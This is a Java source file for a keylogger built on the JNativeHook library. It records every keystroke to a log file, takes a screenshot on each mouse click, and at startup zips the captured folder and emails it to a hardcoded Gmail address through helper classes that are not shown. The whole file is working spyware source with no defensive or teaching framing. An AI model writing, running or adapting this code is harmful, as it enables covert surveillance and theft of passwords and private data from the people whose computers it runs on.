/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseMotionListener;
import java.io.FileWriter;
import java.io.BufferedWriter;
import java.io.File;
import java.util.*;
import org.jnativehook.mouse.NativeMouseInputListener;

/**
 *
 * @author sparsha
 */

public class Keylogger implements NativeKeyListener,NativeMouseInputListener{
    /**
     * @param args the command line arguments
     */
    
    static FileWriter fw;
    static BufferedWriter bw;
    
    private static final String OUTPUT_ZIP_FILE = "Mail.zip";
    private static final String SOURCE_FOLDER = "Screenshots";
    
    public static void main(String[] args) {
        //TODO code application logic here
        
        
        //Send mail for previous posts
        ZipUtils appZip = new ZipUtils();
        appZip.generateFileList(new File(SOURCE_FOLDER));
        appZip.zipIt(OUTPUT_ZIP_FILE);
        
        Mailer m=new Mailer("saha.sparsha@gmail.com");
        m.send_mail();
        
        
        
        try{
        GlobalScreen.registerNativeHook();
        
        fw=new FileWriter("Screenshots/logs.txt",true);
        bw=new BufferedWriter(fw);
        
        }catch(Exception e)
        {
            
        }
        

        
        GlobalScreen.addNativeKeyListener(new Keylogger());
        GlobalScreen.addNativeMouseListener(new Keylogger());
        
        
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        
        try{
        fw=new FileWriter("Screenshots/logs.txt",true);
        bw=new BufferedWriter(fw);
        }
        catch(Exception e){
        }

        
     
        if(nke.getKeyCode()==NativeKeyEvent.VC_SPACE)
            try{
        bw.write(" ");
            }
        catch(Exception e)
        {
        }
        else
            try{
            bw.write(NativeKeyEvent.getKeyText(nke.getKeyCode()));
            }
        catch(Exception e)
        {
            
        }
        try{
        bw.close();
        fw.close();
        }catch(Exception e){
        
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
    }

    @Override
    public void nativeMouseClicked(NativeMouseEvent nme) {
        Screenshot s=new Screenshot("myscreenshot");
        s.getscreenshot();
    }

    @Override
    public void nativeMousePressed(NativeMouseEvent nme) {
        
    }

    @Override
    public void nativeMouseReleased(NativeMouseEvent nme) {
    }

    @Override
    public void nativeMouseMoved(NativeMouseEvent nme) {

    }

    @Override
    public void nativeMouseDragged(NativeMouseEvent nme) {

    }
}